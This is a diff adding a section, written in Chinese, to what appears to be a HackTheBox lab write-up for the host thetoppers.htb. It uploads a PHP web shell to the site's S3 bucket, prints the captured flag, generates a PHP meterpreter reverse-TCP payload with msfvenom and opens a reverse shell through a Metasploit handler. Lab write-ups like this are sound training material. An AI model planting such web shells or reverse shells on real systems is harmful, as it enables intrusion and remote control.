@@ -113,3 +113,57 @@ php
 
 
 
+
+
+
+### 3. falg
+
+> falg
+
+![image-20241129152106591](./assets/image-20241129152106591.png)
+
+```shell
+# 上传shell
+aws s3 --endpoint=http://s3.thetoppers.htb cp shell.php s3://thetoppers.htb
+aws s3 --endpoint=http://s3.thetoppers.htb ls s3://thetoppers.htb
+
+# 页面访问 falg
+a980d99281a28d638ac68b9bf9453c2b
+```
+
+```php
+<?php system($_GET("cmd"));?>
+```
+
+> 木马生成
+
+```shell
+# -p 模块 LHOST 攻击机IP LPORT 端口 -f raw随机
+msfvenom -p php/meterpreter/reverse_tcp LHOST=kali主机 LPORT=通信端口 -f raw > shell.php
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.16.31 LPORT=4444 -f raw > shell.php
+
+```
+
+> 连接木马
+
+```shell
+msfconsole
+
+use exploit/multi/handler
+
+set payload php/meterpreter/reverse_tcp
+
+set LHOST 10.10.16.31 
+
+set LPORT 4444
+
+# 攻击
+run / exploit
+
+# 连接成功了 help查看可以用命令
+meterpreter > 
+
+# 进入shell  
+shell
+```
